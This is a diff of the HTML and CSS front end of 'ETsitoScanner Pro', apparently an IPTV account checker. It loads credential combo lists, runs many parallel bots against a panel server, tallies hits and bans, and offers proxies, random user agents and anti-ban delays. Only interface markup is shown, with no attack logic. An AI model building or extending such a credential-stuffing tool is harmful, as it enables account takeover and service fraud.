@@ -3,263 +3,574 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name="theme-color" content="#0a0f0a">
+<meta name="theme-color" content="#000000">
 <title>ETsitoScanner Pro</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@500;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+<style>
+:root{
+  --g:#00ff41;--g2:#00c832;--g3:#004d18;--g4:#001a08;
+  --cy:#00e5ff;--ye:#ffd600;--re:#ff1744;--mg:#e040fb;
+  --dg:#3a6b3a;--bg:#020402;--bg2:#060d06;
+  --border:#0f2a0f;--card:#080f08;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;background:var(--bg);color:var(--g);font-family:'Share Tech Mono',monospace;overflow:hidden}
+#matrix{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.06;pointer-events:none}
+body::before{content:'';position:fixed;inset:0;z-index:1;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.07) 2px,rgba(0,0,0,0.07) 4px);pointer-events:none}
+body::after{content:'';position:fixed;inset:0;z-index:1;background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,0.75) 100%);pointer-events:none}
+#app{position:relative;z-index:2;display:flex;flex-direction:column;height:100vh;max-width:480px;margin:0 auto}
+
+header{flex-shrink:0;padding:10px 14px 8px;background:linear-gradient(180deg,rgba(0,20,0,0.97),rgba(0,10,0,0.93));border-bottom:1px solid var(--g3);position:relative;overflow:hidden}
+header::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--g),var(--cy),var(--mg),var(--g),transparent);animation:hline 4s linear infinite}
+@keyframes hline{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
+.hi{display:flex;align-items:center;gap:10px}
+.hico{width:40px;height:40px;border-radius:9px;object-fit:cover;border:1px solid var(--g3);box-shadow:0 0 12px rgba(0,255,65,0.25)}
+.ht{flex:1}
+.htitle{font-family:'Orbitron',monospace;font-size:15px;font-weight:900;letter-spacing:2px;color:var(--g);text-shadow:0 0 15px var(--g);animation:glitch 6s linear infinite}
+.htitle .et{color:var(--cy);text-shadow:0 0 15px var(--cy)}
+.hsub{font-size:8px;color:var(--dg);letter-spacing:2.5px;margin-top:1px;font-family:'Rajdhani',sans-serif}
+.hr{display:flex;flex-direction:column;align-items:flex-end;gap:3px}
+.spill{display:flex;align-items:center;gap:4px;background:rgba(0,0,0,0.5);border:1px solid var(--g3);border-radius:10px;padding:3px 8px;font-size:9px;color:var(--dg);letter-spacing:1px}
+.sdot{width:6px;height:6px;border-radius:50%;background:var(--re);box-shadow:0 0 6px var(--re);transition:all .3s}
+.sdot.on{background:var(--g);box-shadow:0 0 10px var(--g);animation:bl 1s ease-in-out infinite}
+@keyframes bl{0%,100%{opacity:1}50%{opacity:.3}}
+@keyframes glitch{0%,90%{text-shadow:0 0 15px var(--g)}93%{text-shadow:-2px 0 var(--cy),2px 0 var(--re)}95%{text-shadow:2px 0 var(--cy),-2px 0 var(--re)}97%{text-shadow:0 0 15px var(--g)}100%{text-shadow:0 0 15px var(--g)}}
+
+nav{flex-shrink:0;display:flex;background:rgba(0,6,0,0.97);border-bottom:1px solid var(--g3)}
+nav button{flex:1;background:none;border:none;color:var(--dg);font-family:'Rajdhani',sans-serif;font-weight:700;font-size:10px;letter-spacing:1px;padding:8px 2px 7px;cursor:pointer;position:relative;text-transform:uppercase;transition:color .2s;display:flex;flex-direction:column;align-items:center;gap:2px}
+nav button .ni{font-size:15px;line-height:1}
+nav button.on{color:var(--g);text-shadow:0 0 8px var(--g)}
+nav button.on::after{content:'';position:absolute;bottom:0;left:15%;right:15%;height:2px;background:var(--g);box-shadow:0 0 8px var(--g);border-radius:1px}
+
+#content{flex:1;overflow-y:auto;overflow-x:hidden;padding:10px;scrollbar-width:thin;scrollbar-color:var(--g3) transparent}
+#content::-webkit-scrollbar{width:3px}
+#content::-webkit-scrollbar-thumb{background:var(--g3)}
+.screen{display:none}.screen.on{display:block}
+
+.card{background:linear-gradient(135deg,rgba(0,12,0,0.92),rgba(0,6,0,0.96));border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:10px;position:relative;overflow:hidden;backdrop-filter:blur(8px)}
+.card::before{content:'';position:absolute;top:0;left:0;width:2px;height:100%}
+.card.cy::before{background:linear-gradient(180deg,var(--cy),transparent)}
+.card.ye::before{background:linear-gradient(180deg,var(--ye),transparent)}
+.card.re::before{background:linear-gradient(180deg,var(--re),transparent)}
+.card.mg::before{background:linear-gradient(180deg,var(--mg),transparent)}
+.card.gn::before{background:linear-gradient(180deg,var(--g),transparent)}
+.card::after{content:'';position:absolute;top:0;right:0;width:50px;height:50px;background:radial-gradient(circle at top right,rgba(0,255,65,0.04),transparent 70%)}
+
+.ct{font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;letter-spacing:2.5px;color:var(--dg);text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.ct::before{content:'▸';color:var(--g);font-size:12px}
+
+/* FILE LIST */
+.flist{display:flex;flex-direction:column;gap:4px;max-height:180px;overflow-y:auto;scrollbar-width:thin;scrollbar-color:var(--g3) transparent}
+.fi{display:flex;align-items:center;padding:8px 10px;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
+.fi::before{content:'';position:absolute;inset:0;background:linear-gradient(90deg,rgba(0,255,65,0.06),transparent);opacity:0;transition:opacity .2s}
+.fi.sel::before{opacity:1}
+.fi.sel{border-color:rgba(0,255,65,0.35)}
+.fn{font-size:11px;color:var(--g);flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-right:8px}
+.fc{font-size:9px;color:var(--dg);letter-spacing:1px;white-space:nowrap}
+.fck{color:var(--g);font-size:11px;margin-left:6px;opacity:0;transition:opacity .2s}
+.fi.sel .fck{opacity:1}
+.ef{text-align:center;padding:18px;color:var(--dg);font-size:10px;letter-spacing:1px}
+.ef .ei{font-size:22px;margin-bottom:5px;opacity:.4}
+
+/* INPUTS */
+.field{margin-bottom:8px}
+.field label{display:block;font-size:9px;color:var(--dg);letter-spacing:2px;margin-bottom:4px;text-transform:uppercase}
+input[type=text],select,textarea{width:100%;background:rgba(0,0,0,0.7);border:1px solid var(--g3);border-radius:3px;color:var(--g);font-family:'Share Tech Mono',monospace;font-size:12px;padding:8px 10px;outline:none;transition:border-color .2s,box-shadow .2s;-webkit-appearance:none}
+input:focus,select:focus,textarea:focus{border-color:var(--g);box-shadow:0 0 0 2px rgba(0,255,65,0.07)}
+textarea{resize:none;height:70px}
+
+/* BUTTONS */
+.btn{width:100%;padding:12px;border:none;border-radius:4px;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:13px;letter-spacing:2px;text-transform:uppercase;cursor:pointer;position:relative;overflow:hidden;transition:all .15s;margin-bottom:7px;display:flex;align-items:center;justify-content:center;gap:6px}
+.btn:active{transform:scale(.98)}
+.btn-g{background:linear-gradient(135deg,#001f0a,#003d14);color:var(--g);border:1px solid var(--g2);box-shadow:0 0 20px rgba(0,255,65,0.1);text-shadow:0 0 8px var(--g)}
+.btn-c{background:linear-gradient(135deg,#001520,#002535);color:var(--cy);border:1px solid #005577;text-shadow:0 0 8px var(--cy)}
+.btn-r{background:linear-gradient(135deg,#1a0005,#2d0009);color:var(--re);border:1px solid #660011;text-shadow:0 0 8px var(--re)}
+.btn-y{background:linear-gradient(135deg,#1a1300,#2d2100);color:var(--ye);border:1px solid #554200;text-shadow:0 0 8px var(--ye)}
+.btn-m{background:linear-gradient(135deg,#150020,#220035);color:var(--mg);border:1px solid #551188;text-shadow:0 0 8px var(--mg)}
+.btn-sm{padding:7px 12px;font-size:10px;letter-spacing:1.5px;width:auto;margin-bottom:0}
+
+/* PROGRESS */
+.pw{background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px;padding:10px;margin-bottom:10px}
+.ph{display:flex;justify-content:space-between;margin-bottom:6px}
+.pp{font-family:'Orbitron',monospace;font-size:14px;color:var(--g);text-shadow:0 0 10px var(--g)}
+.pc{font-size:9px;color:var(--dg);letter-spacing:1px;align-self:flex-end}
+.pt{height:6px;background:rgba(0,255,65,0.05);border-radius:3px;overflow:hidden;border:1px solid var(--g4)}
+.pf{height:100%;background:linear-gradient(90deg,var(--g3),var(--g2),var(--g));border-radius:3px;width:0%;transition:width .5s;box-shadow:0 0 10px var(--g)}
+
+/* STATS */
+.sg{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-bottom:10px}
+.sb{background:rgba(0,0,0,0.6);border:1px solid var(--border);border-radius:4px;padding:10px;text-align:center;position:relative;overflow:hidden}
+.sv{font-family:'Orbitron',monospace;font-size:24px;font-weight:700;line-height:1;margin-bottom:3px;letter-spacing:-1px}
+.sl{font-size:8px;color:var(--dg);letter-spacing:2px}
+.sb-g .sv{color:var(--g);text-shadow:0 0 20px var(--g)}
+.sb-r .sv{color:var(--re);text-shadow:0 0 20px var(--re)}
+.sb-y .sv{color:var(--ye);text-shadow:0 0 20px var(--ye)}
+.sb-c .sv{color:var(--cy);text-shadow:0 0 20px var(--cy)}
+.cpm-big{text-align:center;padding:10px;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px}
+.cv{font-family:'Orbitron',monospace;font-size:30px;color:var(--ye);text-shadow:0 0 25px var(--ye);line-height:1;letter-spacing:-2px}
+.cl{font-size:8px;color:var(--dg);letter-spacing:3px;margin-top:3px}
+
+.sc2{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-bottom:10px}
+.rb{display:inline-flex;align-items:center;gap:5px;background:rgba(0,255,65,0.07);border:1px solid rgba(0,255,65,0.2);color:var(--g);font-size:9px;padding:4px 10px;border-radius:10px;letter-spacing:2px}
+.rd{width:5px;height:5px;border-radius:50%;background:var(--g);animation:bl .7s ease-in-out infinite}
+
+/* SLIDER */
+.slw{margin-bottom:8px}
+.slh{display:flex;justify-content:space-between;margin-bottom:5px}
+.sll{font-size:9px;color:var(--dg);letter-spacing:2px;text-transform:uppercase}
+.slv{font-family:'Orbitron',monospace;font-size:16px;color:var(--g);text-shadow:0 0 8px var(--g)}
+input[type=range]{-webkit-appearance:none;width:100%;height:3px;background:linear-gradient(90deg,var(--g3),var(--g4));border-radius:2px;outline:none}
+input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:20px;height:20px;border-radius:50%;background:radial-gradient(circle,var(--g),var(--g2));box-shadow:0 0 12px var(--g);cursor:pointer}
+
+/* LOG */
+.log{background:#010201;border:1px solid var(--g4);border-radius:3px;padding:8px;height:85px;overflow-y:auto;font-size:9px;line-height:1.8;color:var(--dg);scrollbar-width:thin}
+.lg{color:var(--g)}.lr{color:var(--re)}.ly{color:var(--ye)}.lc{color:var(--cy)}.lm{color:var(--mg)}
+
+/* TOGGLE */
+.tr{display:flex;align-items:center;justify-content:space-between;padding:9px 0;border-bottom:1px solid rgba(0,255,65,0.04)}
+.tr:last-child{border-bottom:none}
+.tl{font-size:11px;color:var(--g)}
+.ts{font-size:9px;color:var(--dg);margin-top:1px}
+.tog{position:relative;width:40px;height:21px;flex-shrink:0}
+.tog input{display:none}
+.tt{position:absolute;inset:0;background:rgba(0,0,0,0.6);border:1px solid var(--g3);border-radius:11px;cursor:pointer;transition:all .25s}
+.tt::after{content:'';position:absolute;top:2px;left:2px;width:15px;height:15px;border-radius:50%;background:var(--dg);transition:all .25s}
+.tog input:checked+.tt{background:rgba(0,255,65,0.1);border-color:var(--g);box-shadow:0 0 10px rgba(0,255,65,0.15)}
+.tog input:checked+.tt::after{transform:translateX(19px);background:var(--g);box-shadow:0 0 8px var(--g)}
+
+/* SERVER */
+.srv{display:flex;align-items:center;padding:7px 8px;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:3px;margin-bottom:5px}
+.su{font-size:10px;color:var(--cy);flex:1;word-break:break-all;margin-right:8px}
+
+/* SEC */
+.sec{font-family:'Rajdhani',sans-serif;font-weight:700;font-size:10px;letter-spacing:3px;color:var(--dg);text-transform:uppercase;margin:12px 0 7px;display:flex;align-items:center;gap:8px}
+.sec::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--g4),transparent)}
+
+/* ═══ HIT CARD ═══ */
+.hit{background:linear-gradient(135deg,rgba(0,35,0,0.8),rgba(0,15,0,0.6));border:1px solid rgba(0,255,65,0.18);border-left:2px solid var(--g);border-radius:6px;margin-bottom:10px;overflow:hidden;animation:hitIn .3s ease}
+@keyframes hitIn{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
+.hit-top{padding:10px 12px 8px}
+.hit-u{color:var(--g);font-size:13px;display:flex;align-items:center;gap:6px}
+.hit-p{color:var(--dg);font-size:10px;margin-top:2px}
+.hit-s{color:var(--cy);font-size:9px;margin-top:3px;word-break:break-all}
+.hit-basic{display:flex;gap:5px;margin-top:7px;flex-wrap:wrap}
+.badge{font-size:8px;padding:2px 7px;border-radius:2px;letter-spacing:1px}
+.b-ye{background:rgba(255,214,0,0.1);color:var(--ye);border:1px solid rgba(255,214,0,0.22)}
+.b-cy{background:rgba(0,229,255,0.07);color:var(--cy);border:1px solid rgba(0,229,255,0.18)}
+.b-gn{background:rgba(0,255,65,0.07);color:var(--g);border:1px solid rgba(0,255,65,0.18)}
+.b-mg{background:rgba(224,64,251,0.07);color:var(--mg);border:1px solid rgba(224,64,251,0.18)}
+.b-re{background:rgba(255,23,68,0.07);color:var(--re);border:1px solid rgba(255,23,68,0.18)}
+
+/* PANEL INFO */
+.hit-panel{border-top:1px solid rgba(0,255,65,0.08);padding:10px 12px}
+.pi-title{font-family:'Rajdhani',sans-serif;font-weight:700;font-size:10px;letter-spacing:2px;color:var(--dg);margin-bottom:8px;display:flex;align-items:center;gap:5px}
+.pi-title::before{content:'📊';font-size:11px}
+.pi-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:5px;margin-bottom:8px}
+.pi-box{background:rgba(0,0,0,0.4);border:1px solid var(--border);border-radius:4px;padding:7px;text-align:center}
+.pi-val{font-family:'Orbitron',monospace;font-size:16px;font-weight:700;line-height:1;margin-bottom:2px}
+.pi-lbl{font-size:8px;color:var(--dg);letter-spacing:1px}
+.piv-g{color:var(--g);text-shadow:0 0 10px var(--g)}
+.piv-c{color:var(--cy);text-shadow:0 0 10px var(--cy)}
+.piv-m{color:var(--mg);text-shadow:0 0 10px var(--mg)}
+.pi-loading{text-align:center;padding:15px;color:var(--dg);font-size:10px;letter-spacing:1px}
+.pi-spinner{display:inline-block;width:16px;height:16px;border:2px solid var(--g3);border-top-color:var(--g);border-radius:50%;animation:spin .8s linear infinite;margin-right:6px;vertical-align:middle}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.hit-acts{padding:8px 12px 10px;display:flex;gap:6px;flex-wrap:wrap}
+
+/* TOAST */
+#toast{position:fixed;bottom:72px;left:50%;transform:translateX(-50%) translateY(12px);background:rgba(0,18,0,0.97);border:1px solid var(--g3);color:var(--g);font-size:11px;padding:9px 18px;border-radius:4px;opacity:0;transition:all .25s;pointer-events:none;z-index:999;white-space:nowrap;box-shadow:0 0 20px rgba(0,255,65,0.12)}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
+.empty{text-align:center;padding:22px;color:var(--dg)}
+.empty .ei{font-size:26px;margin-bottom:7px;opacity:.4}
+.empty p{font-size:10px;letter-spacing:1px}
+.safe{height:env(safe-area-inset-bottom,12px)}
+
+.px-row{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid rgba(0,255,65,0.04);font-size:10px}
+.px-row:last-child{border-bottom:none}
+</style>
 </head>
-<body style="margin:0;background:#050a05;color:#00ff41;font-family:'Share Tech Mono',monospace">
-<div style="max-width:480px;margin:0 auto">
+<body>
+<canvas id="matrix"></canvas>
+<div id="app">
 
-<div style="padding:12px 16px;background:#0a0f0a;border-bottom:1px solid #1a3a1a">
-  <div style="font-family:'Orbitron',monospace;font-size:18px;color:#00ff41;text-shadow:0 0 20px #00ff41">
-    <span style="color:#00e5ff">ET</span>sito IPTV Scanner
-  </div>
-  <div style="font-size:9px;color:#4a7a4a;letter-spacing:3px">PRO v5.0 · POTENCIA · PRECISION · VELOCIDAD</div>
-</div>
-
-<div style="display:flex;background:#0a0f0a;border-bottom:1px solid #1a3a1a">
-  <button onclick="tab('scan')" id="t-scan" style="flex:1;background:none;border:none;color:#00ff41;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:10px;cursor:pointer;border-bottom:2px solid #00ff41">⚡ SCAN</button>
-  <button onclick="tab('config')" id="t-config" style="flex:1;background:none;border:none;color:#4a7a4a;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:10px;cursor:pointer">⚙️ CONFIG</button>
-  <button onclick="tab('hits')" id="t-hits" style="flex:1;background:none;border:none;color:#4a7a4a;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:10px;cursor:pointer">🎯 HITS</button>
-  <button onclick="tab('proxy')" id="t-proxy" style="flex:1;background:none;border:none;color:#4a7a4a;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:10px;cursor:pointer">🔗 PROXY</button>
-</div>
-
-<div id="content" style="padding:12px;height:calc(100vh - 90px);overflow-y:auto">
-
-<!-- SCAN -->
-<div id="s-scan">
-  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #00e5ff;border-radius:4px;padding:12px;margin-bottom:10px">
-    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:6px">▸ SERVIDOR ACTIVO</div>
-    <div id="activeServer" style="font-size:11px;color:#00e5ff">Sin servidor configurado</div>
-    <button onclick="tab('config')" style="margin-top:8px;background:#001a1f;border:1px solid #0077aa;color:#00e5ff;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:7px 12px;border-radius:3px;cursor:pointer">+ CONFIGURAR</button>
-  </div>
-
-  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #ffd600;border-radius:4px;padding:12px;margin-bottom:10px">
-    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:6px">▸ COMBO</div>
-    <div id="comboInfo" style="font-size:11px;color:#ffd600">Sin combo cargado</div>
-    <input type="file" id="comboFile" accept=".txt" style="display:none" onchange="loadCombo(this)">
-    <button onclick="document.getElementById('comboFile').click()" style="margin-top:8px;background:#1a1400;border:1px solid #554400;color:#ffd600;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:7px 12px;border-radius:3px;cursor:pointer">📂 CARGAR COMBO</button>
-  </div>
-
-  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-radius:4px;padding:12px;margin-bottom:10px">
-    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:8px">▸ BOTS: <span id="botsVal" style="color:#00ff41">20</span></div>
-    <input type="range" min="1" max="100" value="20" id="botsSlider" oninput="document.getElementById('botsVal').textContent=this.value" style="width:100%;accent-color:#00ff41">
-  </div>
-
-  <div id="scanPanel" style="display:none;background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #00ff41;border-radius:4px;padding:12px;margin-bottom:10px">
-    <div style="display:flex;justify-content:space-between;margin-bottom:8px">
-      <span style="color:#00ff41;font-size:11px">● ESCANEANDO</span>
-      <span id="scanTime" style="color:#4a7a4a;font-size:11px">00:00:00</span>
+<header>
+  <div class="hi">
+    <img class="hico" id="appIcon" src="icon.png" onerror="this.style.display='none'">
+    <div class="ht">
+      <div class="htitle"><span class="et">ET</span>sito Scanner</div>
+      <div class="hsub">PRO v5.0 · POTENCIA · PRECISION · VELOCIDAD</div>
     </div>
-    <div style="background:#040904;border-radius:3px;height:8px;margin-bottom:8px;overflow:hidden">
-      <div id="progBar" style="height:100%;background:linear-gradient(90deg,#00c832,#00ff41);width:0%;transition:width .5s;box-shadow:0 0 10px #00ff41"></div>
+    <div class="hr">
+      <div class="spill"><div class="sdot" id="dot"></div><span id="mainSt">IDLE</span></div>
+      <div style="font-size:9px;color:var(--dg)" id="clock">00:00:00</div>
     </div>
-    <div style="display:flex;justify-content:space-between;margin-bottom:10px">
-      <span id="pctText" style="color:#00ff41;font-family:'Orbitron',monospace;font-size:13px">0.0%</span>
-      <span id="cntText" style="color:#4a7a4a;font-size:10px">0 / 0</span>
-    </div>
-    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px">
-      <div style="background:#050a05;border:1px solid #1a3a1a;border-radius:3px;padding:10px;text-align:center">
-        <div id="statHits" style="font-family:'Orbitron',monospace;font-size:22px;color:#00ff41;text-shadow:0 0 15px #00ff41">0</div>
-        <div style="font-size:9px;color:#4a7a4a;letter-spacing:2px">HITS</div>
+  </div>
+</header>
+
+<nav>
+  <button class="on" onclick="tab('scan',this)"><span class="ni">⚡</span>SCAN</button>
+  <button onclick="tab('config',this)"><span class="ni">⚙️</span>CONFIG</button>
+  <button onclick="tab('hits',this)"><span class="ni">🎯</span>HITS</button>
+  <button onclick="tab('proxy',this)"><span class="ni">🔗</span>PROXY</button>
+</nav>
+
+<div id="content">
+
+<!-- ═══ SCAN ═══ -->
+<div class="screen on" id="sc-scan">
+  <div id="scanActive" style="display:none">
+    <div class="card gn">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+        <div class="rb"><div class="rd"></div>ESCANEANDO</div>
+        <span style="font-size:10px;color:var(--dg)" id="scanTime">00:00:00</span>
       </div>
-      <div style="background:#050a05;border:1px solid #1a3a1a;border-radius:3px;padding:10px;text-align:center">
-        <div id="statFail" style="font-family:'Orbitron',monospace;font-size:22px;color:#ff1744;text-shadow:0 0 15px #ff1744">0</div>
-        <div style="font-size:9px;color:#4a7a4a;letter-spacing:2px">FAIL</div>
+      <div class="pw">
+        <div class="ph"><span class="pp" id="pctT">0.0%</span><span class="pc" id="cntT">0 / 0</span></div>
+        <div class="pt"><div class="pf" id="pBar"></div></div>
       </div>
-      <div style="background:#050a05;border:1px solid #1a3a1a;border-radius:3px;padding:10px;text-align:center">
-        <div id="statBan" style="font-family:'Orbitron',monospace;font-size:22px;color:#ffd600;text-shadow:0 0 15px #ffd600">0</div>
-        <div style="font-size:9px;color:#4a7a4a;letter-spacing:2px">BANS</div>
+      <div class="sg">
+        <div class="sb sb-g"><div class="sv" id="sHits">0</div><div class="sl">HITS</div></div>
+        <div class="sb sb-r"><div class="sv" id="sFail">0</div><div class="sl">FAIL</div></div>
+        <div class="sb sb-y"><div class="sv" id="sBan">0</div><div class="sl">BANS</div></div>
+        <div class="cpm-big"><div class="cv" id="sCPM">0</div><div class="cl">CHECKS/MIN</div></div>
       </div>
-      <div style="background:#050a05;border:1px solid #1a3a1a;border-radius:3px;padding:10px;text-align:center">
-        <div id="statCPM" style="font-family:'Orbitron',monospace;font-size:22px;color:#ffd600;text-shadow:0 0 15px #ffd600">0</div>
-        <div style="font-size:9px;color:#4a7a4a;letter-spacing:2px">CPM</div>
+      <div class="sc2">
+        <button class="btn btn-y btn-sm" onclick="togglePause()" id="btnP" style="width:100%;justify-content:center">⏸ PAUSAR</button>
+        <button class="btn btn-r btn-sm" onclick="stopScan()" style="width:100%;justify-content:center">⬛ DETENER</button>
       </div>
     </div>
-    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
-      <button onclick="togglePause()" id="btnPause" style="background:#1a1400;border:1px solid #554400;color:#ffd600;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:13px;padding:11px;border-radius:3px;cursor:pointer">⏸ PAUSAR</button>
-      <button onclick="stopScan()" style="background:#1a0005;border:1px solid #550011;color:#ff1744;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:13px;padding:11px;border-radius:3px;cursor:pointer">⬛ DETENER</button>
-    </div>
   </div>
 
-  <div style="background:#020802;border:1px solid #0f1a0f;border-radius:3px;padding:10px;height:100px;overflow-y:auto;font-size:10px;margin-bottom:10px" id="sysLog">
-    <span style="color:#00ff41">[ETsitoScanner Pro v5.0]</span><br>
-    <span style="color:#4a7a4a">[SYS] Listo para escanear...</span>
-  </div>
-
-  <button onclick="startScan()" id="btnStart" style="width:100%;background:linear-gradient(135deg,#003310,#005520);border:1px solid #00c832;color:#00ff41;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:15px;letter-spacing:2px;padding:14px;border-radius:3px;cursor:pointer;text-shadow:0 0 8px #00ff41;box-shadow:0 0 20px rgba(0,255,65,.15)">
-    ⚡ INICIAR ESCANEO
-  </button>
-</div>
-
-<!-- CONFIG -->
-<div id="s-config" style="display:none">
-  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #00e5ff;border-radius:4px;padding:12px;margin-bottom:10px">
-    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:8px">▸ AGREGAR SERVIDOR</div>
-    <input type="text" id="serverInput" placeholder="panel.iptv.com:80 o http://..." style="width:100%;background:#040904;border:1px solid #1a3a1a;border-radius:3px;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:13px;padding:9px 12px;outline:none;box-sizing:border-box">
-    <button onclick="addServer()" style="margin-top:8px;width:100%;background:#001a1f;border:1px solid #0077aa;color:#00e5ff;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:13px;padding:11px;border-radius:3px;cursor:pointer">🔍 VERIFICAR Y AGREGAR</button>
-    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin:10px 0 6px">SERVIDORES</div>
-    <div id="serverList"><div style="color:#4a7a4a;font-size:11px;padding:8px">Sin servidores</div></div>
-  </div>
-
-  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #ffd600;border-radius:4px;padding:12px;margin-bottom:10px">
-    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:8px">▸ COMBO</div>
-    <input type="file" id="comboPicker2" accept=".txt" style="display:none" onchange="loadComboConfig(this)">
-    <div onclick="document.getElementById('comboPicker2').click()" style="border:1px dashed #1a3a1a;border-radius:3px;padding:16px;text-align:center;cursor:pointer">
-      <div style="font-size:24px;margin-bottom:6px">📋</div>
-      <div style="font-size:11px;color:#4a7a4a" id="comboFileName">Toca para seleccionar .txt</div>
+  <div id="scanIdle">
+    <div class="card cy">
+      <div class="ct">SERVIDOR ACTIVO</div>
+      <div id="activeSrv" style="font-size:11px;color:var(--cy)">Sin servidor configurado</div>
+      <div style="margin-top:8px">
+        <button class="btn btn-c btn-sm" onclick="tab('config',document.querySelectorAll('nav button')[1])">⚙ CONFIGURAR</button>
+      </div>
     </div>
-    <div id="comboStats" style="display:none;margin-top:8px;font-size:11px;color:#4a7a4a">
-      Líneas: <span style="color:#00ff41" id="comboLines">0</span> &nbsp; Únicos: <span style="color:#00ff41" id="comboUniq">0</span>
+    <div class="card ye">
+      <div class="ct">COMBO</div>
+      <div id="comboActive" style="font-size:11px;color:var(--ye)">Sin combo seleccionado</div>
+      <div style="margin-top:8px;display:flex;gap:6px">
+        <button class="btn btn-y btn-sm" onclick="tab('config',document.querySelectorAll('nav button')[1])">📋 SELECCIONAR</button>
+        <input type="file" id="cFallback" accept=".txt" style="display:none" onchange="loadComboFile(this)">
+        <button class="btn btn-sm" style="border:1px solid var(--g3);color:var(--dg);background:none" onclick="document.getElementById('cFallback').click()">📂 BUSCAR</button>
+      </div>
     </div>
-  </div>
-
-  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-radius:4px;padding:12px">
-    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:10px">▸ OPCIONES</div>
-    <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #0f1a0f">
-      <span style="font-size:12px">UA Aleatorio</span>
-      <input type="checkbox" id="optUA" checked style="accent-color:#00ff41;width:18px;height:18px">
+    <div class="card">
+      <div class="ct">BOTS</div>
+      <div class="slw">
+        <div class="slh"><span class="sll">SIMULTÁNEOS</span><span class="slv" id="botsV">20</span></div>
+        <input type="range" min="1" max="100" value="20" id="botsR" oninput="document.getElementById('botsV').textContent=this.value">
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-top:6px">
+        <div style="padding:7px;background:rgba(0,0,0,0.4);border:1px solid var(--border);border-radius:3px;font-size:9px;color:var(--dg)">PROXY<div style="color:var(--mg);font-size:11px;margin-top:2px" id="proxyLbl">Directo</div></div>
+        <div style="padding:7px;background:rgba(0,0,0,0.4);border:1px solid var(--border);border-radius:3px;font-size:9px;color:var(--dg)">TIMEOUT<div style="color:var(--cy);font-size:11px;margin-top:2px">10s</div></div>
+      </div>
     </div>
-    <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #0f1a0f">
-      <span style="font-size:12px">Delay anti-ban</span>
-      <input type="checkbox" id="optDelay" checked style="accent-color:#00ff41;width:18px;height:18px">
+    <div class="card">
+      <div class="ct">LOG</div>
+      <div class="log" id="sysLog"><span class="lg">[ETsitoScanner Pro v5.0]</span></div>
     </div>
-    <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0">
-      <span style="font-size:12px">Auto-guardar hits</span>
-      <input type="checkbox" id="optSave" checked style="accent-color:#00ff41;width:18px;height:18px">
-    </div>
+    <button class="btn btn-g" onclick="startScan()">⚡ INICIAR ESCANEO</button>
   </div>
 </div>
 
